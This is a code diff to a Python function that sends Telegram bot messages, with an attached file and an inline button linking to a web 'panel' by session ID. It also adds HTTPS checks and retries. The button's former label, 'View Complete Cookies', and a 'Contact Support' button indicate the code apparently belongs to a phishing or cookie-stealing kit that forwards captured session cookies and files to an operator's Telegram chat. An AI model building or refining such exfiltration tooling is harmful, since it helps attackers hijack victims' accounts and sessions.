@@ -36,12 +36,18 @@ def send_telegram_notification(chat_id: str, token: str, message: str, file_path
                 # Build inline keyboard buttons
                 buttons = []
                 
-                # Add view cookies button if session_id and web_url are provided
+                # Add view on panel button if session_id and web_url are provided
+                # Telegram requires HTTPS URLs and doesn't allow localhost
                 if session_id and web_url:
-                    buttons.append({
-                        'text': '🍪 View Complete Cookies',
-                        'url': f'{web_url}/?session={session_id}'
-                    })
+                    # Validate URL - must be HTTPS and not localhost
+                    url_lower = web_url.lower()
+                    if url_lower.startswith('https://') and 'localhost' not in url_lower and '127.0.0.1' not in url_lower:
+                        buttons.append({
+                            'text': '👁️ View on Panel',
+                            'url': f'{web_url}/?session={session_id}'
+                        })
+                    else:
+                        print(f"[INFO] Skipping inline button - URL must be HTTPS and publicly accessible (got: {web_url})")
                 
                 # Add support button if support_telegram is provided
                 if support_telegram:
@@ -72,12 +78,18 @@ def send_telegram_notification(chat_id: str, token: str, message: str, file_path
             # Build inline keyboard buttons
             buttons = []
             
-            # Add view cookies button if session_id and web_url are provided
+            # Add view on panel button if session_id and web_url are provided
+            # Telegram requires HTTPS URLs and doesn't allow localhost
             if session_id and web_url:
-                buttons.append({
-                    'text': '🍪 View Complete Cookies',
-                    'url': f'{web_url}/?session={session_id}'
-                })
+                # Validate URL - must be HTTPS and not localhost
+                url_lower = web_url.lower()
+                if url_lower.startswith('https://') and 'localhost' not in url_lower and '127.0.0.1' not in url_lower:
+                    buttons.append({
+                        'text': '👁️ View on Panel',
+                        'url': f'{web_url}/?session={session_id}'
+                    })
+                else:
+                    print(f"[INFO] Skipping inline button - URL must be HTTPS and publicly accessible (got: {web_url})")
             
             # Add support button if support_telegram is provided
             if support_telegram:
@@ -96,53 +108,125 @@ def send_telegram_notification(chat_id: str, token: str, message: str, file_path
             
             response = requests.post(url, data=data, timeout=30)
         
-        response.raise_for_status()
-        
-        result = response.json()
-        if result.get('ok'):
-            message_id = result.get('result', {}).get('message_id')
-            print("[OK] Telegram notification sent successfully")
-            return message_id
+        # Check response status
+        if response.status_code == 200:
+            result = response.json()
+            if result.get('ok'):
+                message_id = result.get('result', {}).get('message_id')
+                print("[OK] Telegram notification sent successfully")
+                return message_id
+            else:
+                error_desc = result.get('description', 'Unknown error')
+                print(f"[ERROR] Telegram API returned ok=False: {error_desc}")
+                return None
         else:
-            error_desc = result.get('description', 'Unknown error')
-            print(f"[ERROR] Telegram error: {error_desc}")
+            # Non-200 status code
+            result = response.json() if response.text else {}
+            error_desc = result.get('description', f'HTTP {response.status_code}')
+            print(f"[ERROR] Telegram API error: {error_desc}")
+            print(f"[ERROR] Status code: {response.status_code}")
             print(f"[ERROR] Full response: {result}")
-            # If MarkdownV2 parsing error, try sending without parse_mode
-            if "can't parse entities" in error_desc.lower() or "bad request" in error_desc.lower():
-                print("[INFO] Retrying without MarkdownV2 parse_mode...")
+            
+            # If MarkdownV2 parsing error (400 Bad Request), try sending without parse_mode and without invalid buttons
+            if response.status_code == 400:
+                error_desc_lower = error_desc.lower()
+                # Check if it's a button URL error or MarkdownV2 error
+                is_button_error = 'inline keyboard' in error_desc_lower or 'button url' in error_desc_lower
+                is_markdown_error = "can't parse entities" in error_desc_lower or "parse" in error_desc_lower
+                
+                if is_button_error or is_markdown_error:
+                    print("[INFO] Bad Request detected. Retrying without parse_mode and rebuilding buttons...")
+                    try:
+                        # Rebuild buttons without invalid URLs
+                        retry_buttons = []
+                        if support_telegram:
+                            support_user = support_telegram.replace('@', '')
+                            retry_buttons.append({
+                                'text': '💬 Contact Support',
+                                'url': f'https://t.me/{support_user}'
+                            })
+                        
+                        if file_path and os.path.exists(file_path):
+                            url = f"https://api.telegram.org/bot{token}/sendDocument"
+                            with open(file_path, 'rb') as file:
+                                files = {'document': (os.path.basename(file_path), file)}
+                                data = {
+                                    'chat_id': chat_id,
+                                    'caption': message  # No parse_mode
+                                }
+                                if retry_buttons:
+                                    inline_keyboard = {'inline_keyboard': [retry_buttons]}
+                                    data['reply_markup'] = json.dumps(inline_keyboard)
+                                response = requests.post(url, files=files, data=data, timeout=30)
+                        else:
+                            url = f"https://api.telegram.org/bot{token}/sendMessage"
+                            data = {
+                                'chat_id': chat_id,
+                                'text': message  # No parse_mode
+                            }
+                            if retry_buttons:
+                                inline_keyboard = {'inline_keyboard': [retry_buttons]}
+                                data['reply_markup'] = json.dumps(inline_keyboard)
+                            response = requests.post(url, data=data, timeout=30)
+                        
+                        if response.status_code == 200:
+                            result = response.json()
+                            if result.get('ok'):
+                                message_id = result.get('result', {}).get('message_id')
+                                print("[OK] Telegram notification sent successfully (without MarkdownV2)")
+                                return message_id
+                        else:
+                            retry_result = response.json() if response.text else {}
+                            retry_error = retry_result.get('description', f'HTTP {response.status_code}')
+                            print(f"[ERROR] Retry also failed: {retry_error}")
+                    except Exception as retry_e:
+                        print(f"[ERROR] Retry failed: {retry_e}")
+                        import traceback
+                        print(f"[ERROR] Retry traceback: {traceback.format_exc()}")
+            return None
+            
+    except requests.exceptions.HTTPError as e:
+        # Try to get error details from response
+        try:
+            error_response = e.response.json() if e.response.text else {}
+            error_desc = error_response.get('description', str(e))
+            print(f"[ERROR] Telegram HTTP error: {error_desc}")
+            print(f"[ERROR] Status code: {e.response.status_code}")
+            print(f"[ERROR] Full response: {error_response}")
+            
+            # If it's a 400 Bad Request, it's likely a MarkdownV2 parsing issue
+            if e.response.status_code == 400:
+                print("[INFO] Attempting to send without MarkdownV2 parse_mode...")
                 try:
+                    # Remove parse_mode and retry
                     if file_path and os.path.exists(file_path):
                         url = f"https://api.telegram.org/bot{token}/sendDocument"
                         with open(file_path, 'rb') as file:
                             files = {'document': (os.path.basename(file_path), file)}
-                            data = {
-                                'chat_id': chat_id,
-                                'caption': message
-                            }
+                            data = {'chat_id': chat_id, 'caption': message}
                             if buttons:
                                 inline_keyboard = {'inline_keyboard': [buttons]}
                                 data['reply_markup'] = json.dumps(inline_keyboard)
                             response = requests.post(url, files=files, data=data, timeout=30)
                     else:
                         url = f"https://api.telegram.org/bot{token}/sendMessage"
-                        data = {
-                            'chat_id': chat_id,
-                            'text': message
-                        }
+                        data = {'chat_id': chat_id, 'text': message}
                         if buttons:
                             inline_keyboard = {'inline_keyboard': [buttons]}
                             data['reply_markup'] = json.dumps(inline_keyboard)
                         response = requests.post(url, data=data, timeout=30)
                     
+                    response.raise_for_status()
                     result = response.json()
                     if result.get('ok'):
                         message_id = result.get('result', {}).get('message_id')
                         print("[OK] Telegram notification sent successfully (without MarkdownV2)")
                         return message_id
                 except Exception as retry_e:
-                    print(f"[ERROR] Retry failed: {retry_e}")
-            return None
-            
+                    print(f"[ERROR] Retry without MarkdownV2 also failed: {retry_e}")
+        except:
+            print(f"[ERROR] Telegram HTTP error: {e}")
+        return None
     except Exception as e:
         print(f"[ERROR] Telegram error: {e}")
         import traceback
